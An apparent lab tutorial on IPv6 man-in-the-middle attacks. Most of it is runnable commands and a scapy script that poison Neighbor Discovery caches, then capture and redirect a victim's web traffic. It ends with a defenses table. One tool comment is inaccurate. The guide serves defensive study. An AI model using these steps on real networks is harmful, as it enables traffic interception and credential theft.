# How to Perform IPv6 MITM Attacks in Lab Environments

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: IPv6, MITM, Man-in-the-Middle, NDP Spoofing, Security Testing, Lab

Description: A guide to setting up IPv6 man-in-the-middle attacks using NDP cache poisoning in authorized lab environments to understand and defend against these attacks.

IPv6 man-in-the-middle (MITM) attacks exploit the Neighbor Discovery Protocol (NDP) in the same way that ARP poisoning attacks exploit IPv4's ARP. Understanding how these attacks work is essential for implementing proper defenses. This guide covers MITM techniques for authorized lab research only.

**Warning**: These techniques must only be performed in isolated lab environments on systems you own or have explicit written authorization to test.

## Lab Setup

```
[Attacker VM]     [Victim VM]      [Router/Gateway]
192.168.1.100     192.168.1.10     192.168.1.1
2001:db8::attacker  2001:db8::victim  2001:db8::router
```

All three VMs should be on the same network segment (e.g., a private virtual switch).

## Method 1: NDP Cache Poisoning with parasite6

```bash
# On attacker: enable IPv6 forwarding first
sudo sysctl -w net.ipv6.conf.all.forwarding=1

# Poison victim's NDP cache (tells victim: gateway = attacker's MAC)
sudo parasite6 eth0 2001:db8::victim &

# Poison gateway's NDP cache (tells gateway: victim = attacker's MAC)
sudo fake_router6 eth0 2001:db8::/64 &
```

## Method 2: NDP Spoofing with na6 (SI6 Networks)

```bash
# Enable forwarding
sudo sysctl -w net.ipv6.conf.eth0.forwarding=1

# Tell victim the gateway's address resolves to our MAC
sudo na6 -i eth0 \
  -s 2001:db8::router \
  -d 2001:db8::victim \
  --override \
  --loop --sleep 3 &

# Tell router the victim's address resolves to our MAC
sudo na6 -i eth0 \
  -s 2001:db8::victim \
  -d 2001:db8::router \
  --override \
  --loop --sleep 3 &
```

## Method 3: scapy-based NDP Poisoning

```python
from scapy.all import *
from scapy.layers.inet6 import *

iface = "eth0"
attacker_mac = get_if_hwaddr(iface)
victim = "2001:db8::victim"
gateway = "2001:db8::router"

def poison():
    # Tell victim: gateway is at attacker's MAC
    pkt1 = IPv6(src=gateway, dst=victim) / \
           ICMPv6ND_NA(tgt=gateway, R=1, S=0, O=1) / \
           ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)

    # Tell gateway: victim is at attacker's MAC
    pkt2 = IPv6(src=victim, dst=gateway) / \
           ICMPv6ND_NA(tgt=victim, R=0, S=0, O=1) / \
           ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)

    send([pkt1, pkt2], iface=iface, verbose=0)

# Poison continuously
while True:
    poison()
    time.sleep(3)
```

## Intercepting Traffic

Once MITM is established, traffic flows through the attacker:

```bash
# View intercepted traffic with tcpdump
sudo tcpdump -i eth0 -n ip6 and not icmp6

# Intercept with mitmproxy (for HTTP/HTTPS)
sudo mitmproxy --mode transparent --listen-port 8080

# Redirect victim's web traffic through mitmproxy
sudo ip6tables -t nat -A PREROUTING \
  -p tcp --dport 80 \
  -j REDIRECT --to-port 8080
```

## Verifying MITM Success

```bash
# On victim: check NDP cache is poisoned
ip -6 neigh show
# Should show gateway's IPv6 address mapped to attacker's MAC

# On attacker: verify traffic is passing through
ip -6 route show
netstat -s | grep forward
```

## Cleaning Up the Lab

```bash
# Stop poisoning processes
kill %1 %2

# Flush NDP cache on victim (recovery)
sudo ip -6 neigh flush dev eth0

# Disable forwarding
sudo sysctl -w net.ipv6.conf.all.forwarding=0
```

## Defenses

| Defense | Effectiveness |
|---|---|
| SEND (RFC 3971) | Cryptographically prevents NDP spoofing |
| NDPMon | Detects unexpected NDP changes |
| Static NDP entries | Prevents cache poisoning for known hosts |
| RA Guard | Prevents rogue Router Advertisements |
| Network segmentation | Limits MITM to same segment |

Understanding IPv6 MITM attacks in a lab setting helps security teams validate that defenses like SEND, NDPMon, and RA Guard are properly configured and effective.
